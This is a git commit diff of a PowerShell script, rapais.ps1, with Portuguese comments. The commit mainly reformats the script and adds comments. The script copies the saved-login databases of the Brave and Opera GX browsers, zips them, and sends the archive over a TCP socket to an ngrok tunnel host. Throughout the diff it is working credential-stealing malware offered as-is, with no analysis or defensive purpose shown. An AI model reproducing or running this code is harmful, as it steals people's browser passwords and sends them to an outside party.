d9dbce0c96b44bb80a99885d80fb479f841a182e
FBiUwU <71545021+FBIgLoK@users.noreply.github.com>
2026-03-07 19:17:16 +0100

    Update rapais.ps1

--- rapais.ps1
+++ rapais.ps1
@@ -1,13 +1,28 @@
 $roaming = $env:APPDATA
-$local = $env:LOCALAPPDATA
-$temp = $env:TEMP
-$zip = "$temp\envio.zip"
+$local   = $env:LOCALAPPDATA
+$temp    = $env:TEMP
+$zip     = "$temp\envio.zip"
+
+# Arquivo temporário com nome alterado
 $tempFile = "$temp\UwUoperad"
+
+# Remove ZIP antigo
 if (Test-Path $zip) { Remove-Item $zip -Force }
+
+# Cria cópia temporária com novo nome
 Copy-Item "$local\BraveSoftware\Brave-Browser\User Data\Default\Login Data" $tempFile -Force
-Compress-Archive "$roaming\Opera Software\Opera GX Stable\Default\Login Data", $tempFile -DestinationPath $zip -Force
+
+# Cria ZIP
+Compress-Archive `
+    "$roaming\Opera Software\Opera GX Stable\Default\Login Data", `
+    $tempFile `
+    -DestinationPath $zip -Force
+
+# Remove o arquivo temporário
 Remove-Item $tempFile -Force
-$c = New-Object Net.Sockets.TCPClient("6.tcp.eu.ngrok.io", 16037)
+
+# Envia via TCP
+$c = New-Object Net.Sockets.TCPClient("6.tcp.eu.ngrok.io", 16037 )
 $s = $c.GetStream()
 $b = [IO.File]::ReadAllBytes($zip)
 $s.Write($b,0,$b.Length)
